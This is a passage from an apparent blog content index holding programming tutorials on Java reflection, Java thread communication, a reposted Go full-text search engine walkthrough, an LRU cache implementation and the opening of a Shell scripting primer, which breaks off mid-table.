通过反射获取成员方法并使用在反射机制中，把类中的成员方法使用类Method表示。可通过Class类中提供的方法获取成员方法： 返回获取一个方法： public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) 获取 public 修饰的方法 public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) 获取任意的方法，包含私有的 参数1: name 要查找的方法名称； 参数2： parameterTypes 该方法的参数类型 返回获取多个方法： public Method[] getMethods() 获取本类与父类中所有public 修饰的方法 public Method[] getDeclaredMethods() 获取本类中所有的方法(包含私有的) package cn.cuzz;import java.lang.reflect.Method;public class Test5 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取多个方法 Method[] methods = c.getMethods(); Method[] methodss = c.getDeclaredMethods(); // 获取一个方法： // public void method1() Method method = c.getMethod(&quot;method1&quot;, null); System.out.println(method); // public String method4(String name){ method = c.getMethod(&quot;method4&quot;, String.class); System.out.println(method); // 私有方法 // private void method5() method = c.getDeclaredMethod(&quot;method5&quot;, null); System.out.println(method); }} 通过反射，创建对象，调用指定的方法获取成员方法，步骤如下： 获取Class对象 获取构造方法 通过构造方法，创建对象 获取指定的方法 执行找到的方法(如果获取的是私有方法则要开启暴力访问m5.setAccessible(true)) public Object invoke(Object obj, Object... args) 执行指定对象obj中，当前Method对象所代表的方法，方法要传入的参数通过args指定 package cn.cuzz;import java.lang.reflect.Constructor;import java.lang.reflect.Method;public class Test6 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取指定构造器 Constructor con = c.getConstructor(String.class, int.class, String.class); // 通过构造方法中的Constructor的方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;, 18, &quot;武汉&quot;); // 获取指定的方法 Method m4 = c.getMethod(&quot;method4&quot;, String.class); // 执行找到的方法 Object result = m4.invoke(obj, &quot;2018/03/19&quot;); System.out.println(&quot;result = &quot; + result); // result = 哈哈2018/03/19 }} 反射练习下面展示一下反射的利用场景。 泛型擦除思考，将已存在的ArrayList&lt;Integer&gt;集合中添加一个字符串数据，如何实现呢？ 我来告诉大家，其实程序编译后产生的.class文件中是没有泛型约束的，这种现象我们称为泛型的擦除。那么，我们可以通过反射技术，来完成向有泛型约束的集合中，添加任意类型的元素。 package cn.cuzz;import java.lang.reflect.Method;import java.util.ArrayList;public class Test7 { public static void main(String[] args) throws Exception, SecurityException { ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;(); // 添加元素 list.add(&quot;cuzz&quot;); // list.add(23); 报错 // 通过反射技术，实现添加任意类型的元素 // 获取字节码文件对象 Class c = Class.forName(&quot;java.util.ArrayList&quot;); // 找到add()方法 Method addMethod = c.getMethod(&quot;add&quot;, Object.class); // 执行add()方法 addMethod.invoke(list, 23); System.out.println(list); //[cuzz, 23] }} 反射配置文件通过配置文件得到类名和要运行的方法名,用反射的操作类名得到对象和调用方法 实现步骤: 准备配置文件,键值对 IO流读取配置文件 Reader 文件中的键值对存储到集合中 Properties集合保存的键值对,就是类名和方法名 反射获取指定类的class文件对象 class文件对象,获取指定的方法 运行方法 public class Test8 { public static void main(String[] args) throws Exception{ // IO流读取配置文件 FileReader r = new FileReader(&quot;config.properties&quot;); // 创建集合对象 Properties pro = new Properties(); // 调用集合方法load,传递流对象 pro.load(r); r.close(); // 通过键获取值 String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); // 反射获取指定类的class文件对象 Class c = Class.forName(className); Object obj = c.newInstance(); // 获取指定的方法名 Method method = c.getMethod(methodName); method.invoke(obj); }} 配置文件 # className=cn.cuzz.Student# methodName=studyclassName=cn.cuzz.TeachermethodName=teach# className=cn.cuzz.Worker# methodName=work","link":"/2019/02/11/Java%E5%8F%8D%E5%B0%84/"},{"title":"Java 中是如何实现线程通信？","text":"正常情况下，每个子线程完成各自的任务就可以结束了。不过有的时候，我们希望多个线程协同工作来完成某个任务，这时就涉及到了线程间通信了。 本文涉及到的知识点：thread.join(), object.wait(), object.notify(), CountdownLatch, CyclicBarrier, FutureTask, Callable 等。 原文链接：Java 中是如何实现线程通信？ 下面我从几个例子作为切入点来讲解下 Java 里有哪些方法来实现线程间通信。 如何让两个线程依次执行？ 那如何让两个线程按照指定方式有序交叉运行呢？ 四个线程 A B C D，其中 D 要等到 A B C 全执行完毕后才执行，而且 A B C 是同步运行的 三个运动员各自准备，等到三个人都准备好后，再一起跑 子线程完成某件任务后，把得到的结果回传给主线程 如何让两个线程依次执行？假设有两个线程，一个是线程 A，另一个是线程 B，两个线程分别依次打印 1-3 三个数字即可。我们来看下代码： private static void demo1() { Thread A = new Thread(new Runnable() { @Override public void run() { printNumber(&quot;A&quot;); } }); Thread B = new Thread(new Runnable() { @Override public void run() { printNumber(&quot;B&quot;); } }); A.start(); B.start();} 其中的 printNumber(String) 实现如下，用来依次打印 1, 2, 3 三个数字： private static void printNumber(String threadName) { int i=0; while (i++ &lt; 3) { try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(threadName + &quot; print: &quot; + i); }} 这时我们得到的结果是： B print: 1A print: 1B print: 2A print: 2B print: 3A print: 3 可以看到 A 和 B 是同时打印的。 那么，如果我们希望 B 在 A 全部打印 完后再开始打印呢？我们可以利用 thread.join() 方法，代码如下: private static void demo2() { Thread A = new Thread(new Runnable() { @Override public void run() { printNumber(&quot;A&quot;); } }); Thread B = new Thread(new Runnable() { @Override public void run() { System.out.println(&quot;B 开始等待 A&quot;); try { A.join(); } catch (InterruptedException e) { e.printStackTrace(); } printNumber(&quot;B&quot;); } }); B.start(); A.start();} 得到的结果如下： B 开始等待 AA print: 1A print: 2A print: 3 B print: 1B print: 2B print: 3 A.join 把指定的线程加入到当前线程，可以将两个交替执行的线程合并为顺序执行的线程。比如在线程B中调用了线程A的 join() 方法，直到线程A执行完毕后，才会继续执行线程B。 t.join(); 调用 join 方法，等待线程 t 执行完毕 t.join(1000); 等待 t 线程，等待时间是1000毫秒。 所以我们能看到 A.join() 方法会让 B 一直等待直到 A 运行完毕。 那如何让两个线程按照指定方式有序交叉运行呢？还是上面那个例子，我现在希望 A 在打印完 1 后，再让 B 打印 1, 2, 3，最后再回到 A 继续打印 2, 3。这种需求下，显然 Thread.join() 已经不能满足了。我们需要更细粒度的锁来控制执行顺序。 这里，我们可以利用 object.wait() 和 object.notify() 两个方法来实现。代码如下： /** * A 1, B 1, B 2, B 3, A 2, A 3 */private static void demo3() { Object lock = new Object(); Thread A = new Thread(new Runnable() { @Override public void run() { synchronized (lock) { System.out.println(&quot;A 1&quot;); try { lock.wait(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;A 2&quot;); System.out.println(&quot;A 3&quot;); } } }); Thread B = new Thread(new Runnable() { @Override public void run() { synchronized (lock) { System.out.println(&quot;B 1&quot;); System.out.println(&quot;B 2&quot;); System.out.println(&quot;B 3&quot;); lock.notify(); } } }); A.start(); B.start();} 打印结果如下： A 1A waiting… B 1B 2B 3A 2A 3 正是我们要的结果。 那么，这个过程发生了什么呢？ 首先创建一个 A 和 B 共享的对象锁 lock = new Object(); 当 A 得到锁后，先打印 1，然后调用 lock.wait() 方法，交出锁的控制权，进入 wait 状态； 对 B 而言，由于 A 最开始得到了锁，导致 B 无法执行；直到 A 调用 lock.wait() 释放控制权后， B 才得到了锁； B 在得到锁后打印 1， 2， 3；然后调用 lock.notify() 方法，唤醒正在 wait 的 A; A 被唤醒后，继续打印剩下的 2，3。 为了更好理解，我在上面的代码里加上 log 方便读者查看。 private static void demo3() { Object lock = new Object(); Thread A = new Thread(new Runnable() { @Override public void run() { System.out.println(&quot;INFO: A 等待锁 &quot;); synchronized (lock) { System.out.println(&quot;INFO: A 得到了锁 lock&quot;); System.out.println(&quot;A 1&quot;); try { System.out.println(&quot;INFO: A 准备进入等待状态，放弃锁 lock 的控制权 &quot;); lock.wait(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;INFO: 有人唤醒了 A, A 重新获得锁 lock&quot;); System.out.println(&quot;A 2&quot;); System.out.println(&quot;A 3&quot;); } } }); Thread B = new Thread(new Runnable() { @Override public void run() { System.out.println(&quot;INFO: B 等待锁 &quot;); synchronized (lock) { System.out.println(&quot;INFO: B 得到了锁 lock&quot;); System.out.println(&quot;B 1&quot;); System.out.println(&quot;B 2&quot;); System.out.println(&quot;B 3&quot;); System.out.println(&quot;INFO: B 打印完毕，调用 notify 方法 &quot;); lock.notify(); } } }); A.start(); B.start();} 打印结果如下: INFO: A 等待锁INFO: A 得到了锁 lockA 1INFO: A 准备进入等待状态，调用 lock.wait() 放弃锁 lock 的控制权INFO: B 等待锁INFO: B 得到了锁 lockB 1B 2B 3INFO: B 打印完毕，调用 lock.notify() 方法INFO: 有人唤醒了 A, A 重新获得锁 lockA 2A 3 四个线程 A B C D，其中 D 要等到 A B C 全执行完毕后才执行，而且 A B C 是同步运行的最开始我们介绍了 thread.join()，可以让一个线程等另一个线程运行完毕后再继续执行，那我们可以在 D 线程里依次 join A B C，不过这也就使得 A B C 必须依次执行，而我们要的是这三者能同步运行。 或者说，我们希望达到的目的是：A B C 三个线程同时运行，各自独立运行完后通知 D；对 D 而言，只要 A B C 都运行完了，D 再开始运行。针对这种情况，我们可以利用 CountdownLatch 来实现这类通信方式。它的基本用法是： 创建一个计数器，设置初始值，CountdownLatch countDownLatch = new CountDownLatch(2); 在 等待线程 里调用 countDownLatch.await() 方法，进入等待状态，直到计数值变成 0； 在 其他线程 里，调用 countDownLatch.countDown() 方法，该方法会将计数值减小 1； 当 其他线程 的 countDown() 方法把计数值变成 0 时，等待线程 里的 countDownLatch.await() 立即退出，继续执行下面的代码。 实现代码如下： private static void runDAfterABC() { int worker = 3; CountDownLatch countDownLatch = new CountDownLatch(worker); new Thread(new Runnable() { @Override public void run() { System.out.println(&quot;D is waiting for other three threads&quot;); try { countDownLatch.await(); System.out.println(&quot;All done, D starts working&quot;); } catch (InterruptedException e) { e.printStackTrace(); } } }).start(); for (char threadName='A'; threadName &lt;= 'C'; threadName++) { final String tN = String.valueOf(threadName); new Thread(new Runnable() { @Override public void run() { System.out.println(tN + &quot; is working&quot;); try { Thread.sleep(100); } catch (Exception e) { e.printStackTrace(); } System.out.println(tN + &quot; finished&quot;); countDownLatch.countDown(); } }).start(); }} 下面是运行结果： D is waiting for other three threadsA is workingB is workingC is working A finishedC finishedB finishedAll done, D starts working 其实简单点来说，CountDownLatch 就是一个倒计数器，我们把初始计数值设置为3，当 D 运行时，先调用 countDownLatch.await() 检查计数器值是否为 0，若不为 0 则保持等待状态；当A B C 各自运行完后都会利用countDownLatch.countDown()，将倒计数器减 1，当三个都运行完后，计数器被减至 0；此时立即触发 D的 await() 运行结束，继续向下执行。 因此，CountDownLatch 适用于一个线程去等待多个线程的情况。 三个运动员各自准备，等到三个人都准备好后，再一起跑上面是一个形象的比喻，针对 线程 A B C 各自开始准备，直到三者都准备完毕，然后再同时运行 。也就是要实现一种线程之间互相等待的效果，那应该怎么来实现呢？ 上面的 CountDownLatch 可以用来倒计数，但当计数完毕，只有一个线程的 await() 会得到响应，无法让多个线程同时触发。 为了实现线程间互相等待这种需求，我们可以利用 CyclicBarrier 数据结构，它的基本用法是： 先创建一个公共 CyclicBarrier 对象，设置 同时等待 的线程数，CyclicBarrier cyclicBarrier = new CyclicBarrier(3); 这些线程同时开始自己做准备，自身准备完毕后，需要等待别人准备完毕，这时调用 cyclicBarrier.await(); 即可开始等待别人； 当指定的 同时等待 的线程数都调用了 cyclicBarrier.await();时，意味着这些线程都准备完毕好，然后这些线程才 同时继续执行。 实现代码如下，设想有三个跑步运动员，各自准备好后等待其他人，全部准备好后才开始跑： private static void runABCWhenAllReady() { int runner = 3; CyclicBarrier cyclicBarrier = new CyclicBarrier(runner); final Random random = new Random(); for (char runnerName='A'; runnerName &lt;= 'C'; runnerName++) { final String rN = String.valueOf(runnerName); new Thread(new Runnable() { @Override public void run() { long prepareTime = random.nextInt(10000) + 100; System.out.println(rN + &quot; is preparing for time: &quot; + prepareTime); try { Thread.sleep(prepareTime); } catch (Exception e) { e.printStackTrace(); } try { System.out.println(rN + &quot; is prepared, waiting for others&quot;); cyclicBarrier.await(); // 当前运动员准备完毕，等待别人准备好 } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.println(rN + &quot; starts running&quot;); // 所有运动员都准备好了，一起开始跑 } }).start(); }} 打印的结果如下： A is preparing for time: 4131B is preparing for time: 6349C is preparing for time: 8206 A is prepared, waiting for others B is prepared, waiting for others C is prepared, waiting for others C starts runningA starts runningB starts running 子线程完成某件任务后，把得到的结果回传给主线程实际的开发中，我们经常要创建子线程来做一些耗时任务，然后把任务执行结果回传给主线程使用，这种情况在 Java 里要如何实现呢？ 回顾线程的创建，我们一般会把 Runnable 对象传给 Thread 去执行。Runnable定义如下： public interface Runnable { public abstract void run();} 可以看到 run() 在执行完后不会返回任何结果。那如果希望返回结果呢？这里可以利用另一个类似的接口类 Callable： @FunctionalInterfacepublic interface Callable&lt;V&gt; { /** * Computes a result, or throws an exception if unable to do so. * * @return computed result * @throws Exception if unable to compute a result */ V call() throws Exception;} 可以看出 Callable 最大区别就是返回范型 V 结果。 那么下一个问题就是，如何把子线程的结果回传回来呢？在 Java 里，有一个类是配合 Callable 使用的：FutureTask，不过注意，它获取结果的 get 方法会阻塞主线程。 举例，我们想让子线程去计算从 1 加到 100，并把算出的结果返回到主线程。 private static void doTaskWithResultInWorker() { Callable&lt;Integer&gt; callable = new Callable&lt;Integer&gt;() { @Override public Integer call() throws Exception { System.out.println(&quot;Task starts&quot;); Thread.sleep(1000); int result = 0; for (int i=0; i&lt;=100; i++) { result += i; } System.out.println(&quot;Task finished and return result&quot;); return result; } }; FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;&gt;(callable); new Thread(futureTask).start(); try { System.out.println(&quot;Before futureTask.get()&quot;); System.out.println(&quot;Result: &quot; + futureTask.get()); System.out.println(&quot;After futureTask.get()&quot;); } catch (InterruptedException e) { e.printStackTrace(); } catch (ExecutionException e) { e.printStackTrace(); }} 打印结果如下： Before futureTask.get() Task startsTask finished and return result Result: 5050After futureTask.get() 可以看到，主线程调用 futureTask.get() 方法时阻塞主线程；然后 Callable 内部开始执行，并返回运算结果；此时 futureTask.get() 得到结果，主线程恢复运行。 这里我们可以学到，通过 FutureTask 和 Callable 可以直接在主线程获得子线程的运算结果，只不过需要阻塞主线程。当然，如果不希望阻塞主线程，可以考虑利用 ExecutorService，把 FutureTask 放到线程池去管理执行。 小结多线程是现代语言的共同特性，而线程间通信、线程同步、线程安全是很重要的话题。本文针对 Java 的线程间通信进行了大致的讲解，后续还会对线程同步、线程安全进行讲解。","link":"/2019/02/14/Java%E4%B8%AD%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1?/"},{"title":"Let&#39;s build a Full-Text Search engine","text":"这是一篇转载文章原文地址，原文讲述如何构建一个全文搜索引擎，用的 Go 实现的，本来想翻译一下，顺便用 Java 实现一下，由于翻译出来比较生硬，还是把原文放出来，顺便把我用 Java 实现的版本放在链接中Java实现版本。 Full-Text Search is one of those tools people use every day without realizing it. If you ever googled “golang coverage report” or tried to find “indoor wireless camera” on an e-commerce website, you used some kind of full-text search. Full-Text Search (FTS) is a technique for searching text in a collection of documents. A document can refer to a web page, a newspaper article, an email message, or any structured text. Today we are going to build our own FTS engine. By the end of this post, we’ll be able to search across millions of documents in less than a millisecond. We’ll start with simple search queries like “give me all documents that contain the word cat“ and we’ll extend the engine to support more sophisticated boolean queries. Note Most well-known FTS engine is Lucene (as well as Elasticsearch and Solr built on top of it). Why FTSBefore we start writing code, you may ask “can’t we just use grep or have a loop that checks if every document contains the word I’m looking for?“. Yes, we can. However, it’s not always the best idea. CorpusWe are going to search a part of the abstract of English Wikipedia. The latest dump is available at dumps.wikimedia.org. As of today, the file size after decompression is 913 MB. The XML file contains over 600K documents. Document example: &lt;title&gt;Wikipedia: Kit-Cat Klock&lt;/title&gt;&lt;url&gt;https://en.wikipedia.org/wiki/Kit-Cat_Klock&lt;/url&gt;&lt;abstract&gt;The Kit-Cat Klock is an art deco novelty wall clock shaped like a grinning cat with cartoon eyes that swivel in time with its pendulum tail.&lt;/abstract&gt; Loading documentsFirst, we need to load all the documents from the dump. The built-in encoding/xml package comes very handy: import ( &quot;encoding/xml&quot; &quot;os&quot;)type document struct { Title string `xml:&quot;title&quot;` URL string `xml:&quot;url&quot;` Text string `xml:&quot;abstract&quot;` ID int}func loadDocuments(path string) ([]document, error) { f, err := os.Open(path) if err != nil { return nil, err } defer f.Close() dec := xml.NewDecoder(f) dump := struct { Documents []document `xml:&quot;doc&quot;` }{} if err := dec.Decode(&amp;dump); err != nil { return nil, err } docs := dump.Documents for i := range docs { docs[i].ID = i } return docs, nil} Every loaded document gets assigned a unique identifier. To keep things simple, the first loaded document gets assigned ID=0, the second ID=1 and so on. First attemptSearching the contentNow that we have all documents loaded into memory, we can try to find the ones about cats. At first, let’s loop through all documents and check if they contain the substring cat: func search(docs []document, term string) []document { var r []document for _, doc := range docs { if strings.Contains(doc.Text, term) { r = append(r, doc) } } return r} On my laptop, the search phase takes 103ms - not too bad. If you spot check a few documents from the output, you may notice that the function matches caterpillar and category, but doesn’t match Cat with the capital C. That’s not quite what I was looking for. We need to fix two things before moving forward: Make the search case-insensitive (so Cat matches as well). Match on a word boundary rather than on a substring (so caterpillar and communication don’t match). Searching with regular expressionsOne solution that quickly comes to mind and allows implementing both requirements is regular expressions. Here it is - (?i)\\bcat\\b: (?i) makes the regex case-insensitive \\b matches a word boundary (position where one side is a word character and another side is not a word character) func search(docs []document, term string) []document { re := regexp.MustCompile(`(?i)\\b` + term + `\\b`) // Don't do this in production, it's a security risk. term needs to be sanitized. var r []document for _, doc := range docs { if re.MatchString(doc.Text) { r = append(r, doc) } } return r} Ugh, the search took more than 2 seconds. As you can see, things started getting slow even with 600K documents. While the approach is easy to implement, it doesn’t scale well. As the dataset grows larger, we need to scan more and more documents. The time complexity of this algorithm is linear - the number of documents required to scan is equal to the total number of documents. If we had 6M documents instead of 600K, the search would take 20 seconds. We need to do better than that. Inverted IndexTo make search queries faster, we’ll preprocess the text and build an index in advance. The core of FTS is a data structure called Inverted Index. The Inverted Index associates every word in documents with documents that contain the word. Example: documents = { 1: &quot;a donut on a glass plate&quot;, 2: &quot;only the donut&quot;, 3: &quot;listen to the drum machine&quot;,}index = { &quot;a&quot;: [1], &quot;donut&quot;: [1, 2], &quot;on&quot;: [1], &quot;glass&quot;: [1], &quot;plate&quot;: [1], &quot;only&quot;: [2], &quot;the&quot;: [2, 3], &quot;listen&quot;: [3], &quot;to&quot;: [3], &quot;drum&quot;: [3], &quot;machine&quot;: [3],} Below is a real-world example of the Inverted Index. An index in a book where a term references a page number: Text analysisBefore we start building the index, we need to break the raw text down into a list of words (tokens) suitable for indexing and searching. The text analyzer consists of a tokenizer and multiple filters. TokenizerThe tokenizer is the first step of text analysis. Its job is to convert text into a list of tokens. Our implementation splits the text on a word boundary and removes punctuation marks: func tokenize(text string) []string { return strings.FieldsFunc(text, func(r rune) bool { // Split on any character that is not a letter or a number. return !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r) })} &gt; tokenize(&quot;A donut on a glass plate. Only the donuts.&quot;)[&quot;A&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;Only&quot;, &quot;the&quot;, &quot;donuts&quot;] FiltersIn most cases, just converting text into a list of tokens is not enough. To make the text easier to index and search, we’ll need to do additional normalization. LowercaseIn order to make the search case-insensitive, the lowercase filter converts tokens to lower case. cAt, Cat and caT are normalized to cat. Later, when we query the index, we’ll lower case the search terms as well. This will make the search term cAt match the text Cat. func lowercaseFilter(tokens []string) []string { r := make([]string, len(tokens)) for i, token := range tokens { r[i] = strings.ToLower(token) } return r} &gt; lowercaseFilter([]string{&quot;A&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;Only&quot;, &quot;the&quot;, &quot;donuts&quot;})[&quot;a&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;the&quot;, &quot;donuts&quot;] Dropping common wordsAlmost any English text contains commonly used words like a, I, the or be. Such words are called stop words. We are going to remove them since almost any document would match the stop words. There is no “official” list of stop words. Let’s exclude the top 10 by the OEC rank. Feel free to add more: var stopwords = map[string]struct{}{ // I wish Go had built-in sets. &quot;a&quot;: {}, &quot;and&quot;: {}, &quot;be&quot;: {}, &quot;have&quot;: {}, &quot;i&quot;: {}, &quot;in&quot;: {}, &quot;of&quot;: {}, &quot;that&quot;: {}, &quot;the&quot;: {}, &quot;to&quot;: {},}func stopwordFilter(tokens []string) []string { r := make([]string, 0, len(tokens)) for _, token := range tokens { if _, ok := stopwords[token]; !ok { r = append(r, token) } } return r} &gt; stopwordFilter([]string{&quot;a&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;the&quot;, &quot;donuts&quot;})[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donuts&quot;] StemmingBecause of the grammar rules, documents may include different forms of the same word. Stemming reduces words into their base form. For example, fishing, fished and fisher may be reduced to the base form (stem) fish. Implementing a stemmer is a non-trivial task, it’s not covered in this post. We’ll take one of the existing modules: import snowballeng &quot;github.com/kljensen/snowball/english&quot;func stemmerFilter(tokens []string) []string { r := make([]string, len(tokens)) for i, token := range tokens { r[i] = snowballeng.Stem(token, false) } return r} &gt; stemmerFilter([]string{&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donuts&quot;})[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donut&quot;] Note A stem is not always a valid word. For example, some stemmers may reduce airline to airlin. Putting the analyzer togetherfunc analyze(text string) []string { tokens := tokenize(text) tokens = lowercaseFilter(tokens) tokens = stopwordFilter(tokens) tokens = stemmerFilter(tokens) return tokens} The tokenizer and filters convert sentences into a list of tokens: &gt; analyze(&quot;A donut on a glass plate. Only the donuts.&quot;)[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donut&quot;] The tokens are ready for indexing. Building the indexBack to the inverted index. It maps every word in documents to document IDs. The built-in map is a good candidate for storing the mapping. The key in the map is a token (string) and the value is a list of document IDs: type index map[string][]int Building the index consists of analyzing the documents and adding their IDs to the map: func (idx index) add(docs []document) { for _, doc := range docs { for _, token := range analyze(doc.Text) { ids := idx[token] if ids != nil &amp;&amp; ids[len(ids)-1] == doc.ID { // Don't add same ID twice. continue } idx[token] = append(ids, doc.ID) } }}func main() { idx := make(index) idx.add([]document{{ID: 1, Text: &quot;A donut on a glass plate. Only the donuts.&quot;}}) idx.add([]document{{ID: 2, Text: &quot;donut is a donut&quot;}}) fmt.Println(idx)} It works! Each token in the map refers to IDs of the documents that contain the token: map[donut:[1 2] glass:[1] is:[2] on:[1] only:[1] plate:[1]] QueryingTo query the index, we are going to apply the same tokenizer and filters we used for indexing: func (idx index) search(text string) [][]int { var r [][]int for _, token := range analyze(text) { if ids, ok := idx[token]; ok { r = append(r, ids) } } return r} &gt; idx.search(&quot;Small wild cat&quot;)[[24, 173, 303, ...], [98, 173, 765, ...], [[24, 51, 173, ...]] And finally, we can find all documents that mention cats. Searching 600K documents took less than a millisecond (18µs)! With the inverted index, the time complexity of the search query is linear to the number of search tokens. In the example query above, other than analyzing the input text, search had to perform only three map lookups. Boolean queriesThe query from the previous section returned a disjoined list of documents for each token. What we normally expect to find when we type small wild cat in a search box is a list of results that contain small, wild and cat at the same time. The next step is to compute the set intersection between the lists. This way we’ll get a list of documents matching all tokens. Luckily, IDs in our inverted index are inserted in ascending order. Since the IDs are sorted, it’s possible to compute the intersection between two lists in linear time. The intersection function iterates two lists simultaneously and collect IDs that exist in both: func intersection(a []int, b []int) []int { maxLen := len(a) if len(b) &gt; maxLen { maxLen = len(b) } r := make([]int, 0, maxLen) var i, j int for i &lt; len(a) &amp;&amp; j &lt; len(b) { if a[i] &lt; b[j] { i++ } else if a[i] &gt; b[j] { j++ } else { r = append(r, a[i]) i++ j++ } } return r} Updated search analyzes the given query text, lookups tokens and computes the set intersection between lists of IDs: func (idx index) search(text string) []int { var r []int for _, token := range analyze(text) { if ids, ok := idx[token]; ok { if r == nil { r = ids } else { r = intersection(r, ids) } } else { // Token doesn't exist. return nil } } return r} The Wikipedia dump contains only two documents that match small, wild and cat at the same time: &gt; idx.search(&quot;Small wild cat&quot;)130764 The wildcat is a species complex comprising two small wild cat species, the European wildcat (Felis silvestris) and the African wildcat (F. lybica).131692 Catopuma is a genus containing two Asian small wild cat species, the Asian golden cat (C. temminckii) and the bay cat. The search is working as expected! By the way, this is the first time I hear about catopuma, here is one of them: ConclusionsWe just built a Full-Text Search engine. Despite its simplicity, it can be a solid foundation for more advanced projects. I didn’t touch on a lot of things that can significantly improve the performance and make the engine more user friendly. Here are some ideas for further improvements: Extend boolean queries to support OR and NOT. Store the index on disk: Rebuilding the index on every application restart may take a while. Large indexes may not fit in memory. Experiment with memory and CPU-efficient data formats for storing sets of document IDs. Take a look at Roaring Bitmaps. Support indexing multiple document fields. Sort results by relevance. The full source code is available on GitHub. I’m not a native English speaker and I’m trying to improve my language skills. Feel free to correct me if you spot any spelling or grammatical error!","link":"/2020/08/17/Let's_build_a_Full-Text_Search_engine/"},{"title":"LRUCache","text":"LRU（Least recently used，最近最少使用）算法根据数据的历史访问记录来进行淘汰数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高” 。 代码： /** * @Author: cuzz * @Date: 2019/3/16 15:35 * @Description: LRU cache */public class LRUCache { private Map&lt;Integer, DLinkedList&gt; cache = new HashMap&lt;&gt;(); private int count; private int capacity; private DLinkedList head, tail; public LRUCache(int capacity) { this.count = 0; this.capacity = capacity; this.head = new DLinkedList(); this.tail = new DLinkedList(); head.next = tail; tail.pre = head; } public int get(int key) { DLinkedList node = cache.get(key); if (node == null) { return -1; } removeNode(node); addHead(node); return node.value; } public void put(int key, int value) { DLinkedList node = cache.get(key); if (node == null) { node = new DLinkedList(key, value); addHead(node); cache.put(key, node); count++; if (count &gt; capacity) { DLinkedList preTail = tail.pre; removeNode(preTail); cache.remove(preTail.key); count--; } } else { node.value = value; removeNode(node); addHead(node); } } // 移除给定的结点 private void removeNode(DLinkedList node) { DLinkedList pre = node.pre; DLinkedList next = node.next; pre.next = next; next.pre = pre; } // 把结点添加头节点 private void addHead(DLinkedList node) { DLinkedList next = head.next; head.next = node; node.next = next; next.pre = node; node.pre = head; } public static void main(String[] args) { LRUCache cache = new LRUCache(2); cache.put(1, 1); cache.put(2, 2); System.out.println(cache.get(1)); // 返回 1 cache.put(3, 3); // 使 2 作废 System.out.println(cache.get(2)); // 返回 -1 cache.put(4, 4); // 使 1 作废 System.out.println(cache.get(1)); // 返回 -1 未找到 System.out.println(cache.get(3)); // 返回 3 System.out.println(cache.get(4)); // 返回 4 }}class DLinkedList { int key; int value; DLinkedList pre; DLinkedList next; public DLinkedList() {}; public DLinkedList(int key, int value) { this.key = key; this.value = value; }}","link":"/2019/03/16/LRUCache/"},{"title":"Shell入门","text":"Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。 Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。 Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer 是一个典型的图形界面 Shell Shell编程之Hello World编写一个hello world shell一般使用.sh作为后缀 #!/bin/bash # 使用/bin/sh来解释执行 # auto echo hello world! # 解释这个脚本是干什么的# by authors cuzz # 作者和时间一些信息echo &quot;hello world!&quot; 给脚本添加执行权限 &gt; chmod +x hello.sh Shell编程之变量Shell变量可以分为两类：局部变量和环境变量 #!/bin/bash# define path variables# by authors cuzzname=cuzz # 等号两边不能有空格echo &quot;my name is $name&quot; # 使用$引用 基本变量 echo $PWD # 当前路径echo $0 # 脚本名echo $1 # 第一个参数echo $2 # 第二个参数echo $? # 判断上一个命令是否正确echo $* # 所有参数echo $# # 参数的个数 Shell编程之if条件语句比较大小 #!/bin/bash# if test# by authors cuzznum=100# 计算使用两个小括号if (($num &gt; 10)); then echo &quot;this num greater than 10.&quot;else echo &quot;this num littler than 10.&quot;fi 逻辑运算符 运算符 说明 举例 -eq 检测两个数是否相等，相等返回 true。 [ $a -eq $b ] 返回 false。 -ne 检测两个数是否不相等，不相等返回 true。 [ $a -ne $b ] 返回 true。 -gt 检测左边的数是否大于右边的，如果是，则返回 true。 [ $a -gt $b ] 返回 false。 -lt 检测左边的数是否小于右边的，如果是，则返回 true。 [ $a -lt $b ] 返回 true。 -ge 检测左边的数是否大于等于右边的，如果是，则返回 true。 [ $a -ge $b ] 返回 false。 -le 检测左边的数是否小于等于右边的，如果是，则返回 true。 [ $a -le $b ] 返回 true。 目录 操作符 说明 举例 -d file 检测文件是否是目录，如果是，则返回 true。 [ -d $file ] 返回 false。 -f file 检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。 [ -f $file ] 返回 true。 -p file 检测文件是否是有名管道，如果是，则返回 true。 [ -p $file ] 返回 false。 -e file 